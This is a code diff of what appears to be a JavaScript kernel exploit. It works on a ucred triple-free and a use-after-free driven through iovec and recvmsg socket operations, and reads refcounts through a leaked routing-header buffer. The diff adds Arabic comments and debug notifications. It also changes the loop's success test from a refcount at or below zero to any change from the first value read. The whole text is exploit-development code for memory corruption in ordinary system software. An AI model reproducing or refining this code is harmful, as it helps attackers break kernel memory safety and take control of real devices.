@@ -1401,6 +1401,7 @@ function trigger_ucred_triplefree() {
 
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
 
+      // تشغيل الدورة
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
@@ -1413,16 +1414,21 @@ function trigger_ucred_triplefree() {
       var ref = read32(leak_rthdr);
       last_ref = ref;
 
+      // أول قراءة
       if (first_ref === -1) {
         first_ref = ref;
+        send_notification("[STEP 10] First ref=" + first_ref);
       }
 
-      if (ref <= 0) {
-        send_notification("[STEP 10] REF SUCCESS HIT (ref <= 0)");
+      // الشرط المنطقي: ref تغيّر عن أول قيمة
+      if (ref !== first_ref) {
+        send_notification("[STEP 10] REF SUCCESS HIT (ref changed from " +
+                          first_ref + " → " + ref + ")");
         ref_success = true;
         break;
       }
 
+      // لوج للتتبع
       send_notification(
         "[DEBUG] REF=" + ref +
         " | first_ref=" + first_ref +
@@ -1432,16 +1438,19 @@ function trigger_ucred_triplefree() {
       count++;
     }
 
+    // نهاية STEP 10
     send_notification(
       "[STEP 10] Done — ref_success=" + ref_success +
       " | last_ref=" + last_ref
     );
 
+    // لو ref لم يتغير → فشل
     if (!ref_success) {
       send_notification("[STEP 10] ref_success=false → CONTINUE LOOP");
       close(new BigInt(uaf_socket));
       continue;
     }
+
 
     // STEP 11 (جديد) — تجهيز التريبلت قبل أي close إضافي
     send_notification("[STEP 11] Preparing triplets from twins");
